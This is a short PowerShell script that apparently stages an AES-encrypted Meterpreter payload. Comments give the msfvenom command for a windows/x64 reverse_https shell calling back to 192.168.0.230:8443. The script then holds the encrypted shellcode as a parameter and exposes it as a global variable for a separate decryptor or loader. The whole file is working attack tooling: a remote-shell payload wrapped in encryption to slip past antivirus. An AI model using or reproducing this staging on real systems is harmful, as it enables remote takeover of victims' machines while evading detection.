# Use msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.230 LPORT=8443 EXITFUNC=thread -f ps1 -o ran3.ps1
# Then use the AESencrypt.ps1 to encrypt the shellcode (just the shellcode) and set the decryption key
# Input the encrypted Shellcode as the $EncryptedContent Variable
# Ensure that the variable is stored using $AESrun

param(
    [string]$EncryptedContent = "e9oNBYnY5AIMa2oGl9v2Aq23YJ0ETtSxmsuQWE7tmQ881R/DxocEN+n6yYGwlO7ku51JrGK1iewMJa6Nw4dZe2Bx1wHwjwWjoqW1xrNOsnVVo5qx3Ve+sLgbZtCfagCcdMjTM0A1+Z4NQ9D4noEHSgBz1VzRdCDkyLG6YHJMtKBnrSRlNdAOdgumplTW5jziMIwpg/0Hsb8tBLHlnyjCGBS5dxYV6a/ElebmfX1q3O627Uye0577KEcpC13dhd1hk2cIU5FvyWrBe30Jhkr0aX6RUx89DGQikZlSwFDsxWpU8QWWk71sBa3jyV+SHLuxll4hU5+KyA6NTrqU/MSNbsE6SHZWYN1Y5oYU6fNKFtQoWuKh+23JNTNTDNNmZjusbHma62Lkld/7vJOoan+JYXf6hDaYnTGo4mf3J1ByaPumh/qivBXEezrdSRV/Ru/QeOHzNH6NikO7xVdTvRxwWPd4U56sxGiumksTH+f77mklBZxFBJuOKLYqBbvsg/xo5PtzjuaZ4kRxMo8Xq6qTotWFhoDnCwj+5il0ylcj7ER2K7cK8K8scPMru9utMO4p9PH+ghF04ZzhhPY27/K5O2HblJT0GpLaEiJCBPZ0JJ6ZOhtbvhqLP9LVkglQs5JW/9ztkX5zB19fO7u/nAGTdUiJ5jNE3dJjH6lefr3HVFLcLRTQ+9r9iyfgKEmJSlW9pfxxmj1CN1XZx2nLhnitqBB4/cMd94JY02C6Msfm7RtPinmk/jXPPxXdRHT50F93t+S1MTgu/oAycc1rfmnpoOsvfQYR47+Y/yNUWU+myY7SYrAWGaiHnOhOI0V1bfRBO96ReoBtPZYizC1xfWCYaw=="
)

# Set the AESrun variable in global scope
$global:AESrun = $EncryptedContent